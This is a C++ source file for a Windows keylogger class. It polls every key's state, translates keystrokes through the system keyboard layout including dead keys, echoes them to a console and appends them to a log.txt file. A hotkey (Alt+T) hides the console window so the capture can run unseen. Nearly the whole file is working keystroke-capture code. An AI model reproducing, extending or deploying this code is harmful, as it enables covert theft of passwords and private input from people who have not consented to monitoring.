﻿#pragma once

#include "keylogger.h"

#include "string"

Keylogger::Keylogger()	
	: Keyboard()
	, file("log.txt", std::ofstream::app)
	, keylog(nullptr) 
	, handle()
	, visible(true) 
{
	setlocale(LC_ALL, "");

	AllocConsole();
	handle = FindWindowA("ConsoleWindowClass", NULL);
	show();
}

void Keylogger::startKeylog() {
	auto listener = [this]() {
		while (isKeylogging()) {
			setKeysState();
			translateKeysStates();
			listen();

			std::this_thread::sleep_for(polling);
		}
	};
	keylog = new std::thread(listener);
}
void Keylogger::stopKeylog() {
	std::thread* tempHolder = keylog;
	keylog = nullptr;

	std::cout << std::endl << "Keylogger stopped. enter E to start again, N to exit or Y for a new DLL: ";
	std::string input; //FIX THIS
	std::cin >> input;

	if (input == "N") {
		tempHolder->detach();
		return;
	}

	if (input == "E") {
		keylog = tempHolder;
		return;
	}

	std::cout << std::endl << "Enter new DLL (must be an existent system32 KBD**.dll): ";
	std::string newDLL;
	std::cin >> newDLL;

	while (!changeLayout(newDLL.c_str())) {
		std::cout << std::endl << "DLL not found! please try again: ";
		std::cin >> newDLL;
	}

	keylog = tempHolder;
}
bool Keylogger::isKeylogging() {
	return keylog != nullptr;
}

void Keylogger::setKeysState() {
	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		setKeyState(i, GetKeyState(i));
	}
}
void Keylogger::translateKeysStates() {
	const auto& keys = getKeys();
	const auto& layout = getLayout();
	const auto& keysLayout = getKeysLayout();
	const auto& nonPrintableKeys = getNonPrintableKeys();

	const bool shift = keys[VK_SHIFT].isPressed();
	const bool ctrl = keys[VK_CONTROL].isPressed();
	const bool alt = keys[VK_MENU].isPressed();

	const bool caps = keys[VK_CAPITAL].isToggled();
	const bool altgr = ctrl && alt; 

	//iterate through printable keys
	for (size_t i = 0; i < keysLayout.size(); i++) {
		const auto& keyLayout = keysLayout.at(i);
		if (keyLayout.VirtualKey == 0xFF) continue; //deadkey 

		const auto& key = keys.at(keyLayout.VirtualKey);

		if (!key.isAlternating() || !key.isPressed()) continue; //not worth logging

		//If keyLayout has CAPLOK or CAPLOKALTGR attribute, change the "shift" modififier
		const auto& attributes = keyLayout.Attributes;
		const bool upper{
			attributes & CAPLOK && !altgr || attributes & CAPLOKALTGR && altgr ?
			shift != caps :
			shift
		};

		//Set index of wch[] array with respect to shift state modifiers (shift, ctrl, alt)
		const BYTE index = layout.pCharModifiers->ModNumber[
			(upper ? KBDSHIFT : 0) | (ctrl ? KBDCTRL : 0) | (alt ? KBDALT : 0)
		];

		//Key + dead key handling
		if (loadedDeadKey) {
			const auto& deadKeys = layout.pDeadKey;
			const long keyAndDiacritic = MAKELONG(keyLayout.wch[index], loadedDeadKey);

			bool found = false;
			for (int i = 0; deadKeys[i].dwBoth; i++) {
				const auto& deadKey = deadKeys[i];
				const auto& curKeyAndDiacritic = deadKey.dwBoth;
				if (keyAndDiacritic == curKeyAndDiacritic) {
					handleTranslated(deadKey.wchComposed); // e.g. é (´ + e)
					found = true;
					break;
				}
			}

			if (!found) {
				handleTranslated(loadedDeadKey); // e.g. ´
				handleTranslated(keyLayout.wch[index]); //e.g. t
			}

			loadedDeadKey = 0;
		}
		//Load dead key 
		else if (keyLayout.wch[index] == WCH_DEAD) {
			const auto& nextKeyLayout = keysLayout.at(++i);
			loadedDeadKey = nextKeyLayout.wch[index];
		}
		//Normal input
		else if (keyLayout.wch[index] != 0) {
			handleTranslated(keyLayout.wch[index]); //e.g. t
		}
	}	
	//iterate through non-printable keys
	for (size_t i = 0; i < nonPrintableKeys.size(); i++) {
		const auto& nonPrintableKey = nonPrintableKeys.at(i);
		const auto& key = keys.at(nonPrintableKey.virtualKey);

		if (!key.isPressed() || !key.isAlternating()) continue;

		handleTranslated(nonPrintableKey.description);
	}
}

void Keylogger::listen() {
	const auto& keys = getKeys();

	const auto& ctrl = keys[VK_CONTROL];
	const auto& alt = keys[VK_MENU];
	const auto& t = keys['T'];
	const auto& x = keys['X'];
	const auto& s = keys['S'];

	const bool toggle = !ctrl.isPressed() && alt.isPressed() && t.isPressed() && t.isAlternating(); //alt + t
	const bool kill = !ctrl.isPressed() && alt.isPressed() && x.isPressed() && x.isAlternating(); //alt + x
	const bool stop = !ctrl.isPressed() && alt.isPressed() && s.isPressed() && s.isAlternating(); //alt + s

	if (toggle) {
		toggleWindow();
	}
	if (kill) {
		destroyWindow();
	}
	if (stop && visible) {
		stopKeylog();
	}
}
void Keylogger::show() {
	ShowWindow(handle, SW_SHOWDEFAULT);
}
void Keylogger::hide() {
	ShowWindow(handle, SW_HIDE);
}

void Keylogger::toggleWindow() {
	visible ? hide() : show();
	visible = !visible;
}
void Keylogger::destroyWindow() {
	SendMessageW(handle, WM_CLOSE, 0, 0);
}

template<typename T> void Keylogger::handleTranslated(const T output) {
	showTranslated(output);
	saveTranslated(output);
}
template<typename T> void Keylogger::showTranslated(const T output) {
	if (!std::wcout.good()) std::wcout.clear();
	std::wcout << output;
	std::wcout.flush();
}
template<typename T> void Keylogger::saveTranslated(const T output) {
	if (!file.good()) file.clear();
	file << output;
	file.flush();
}

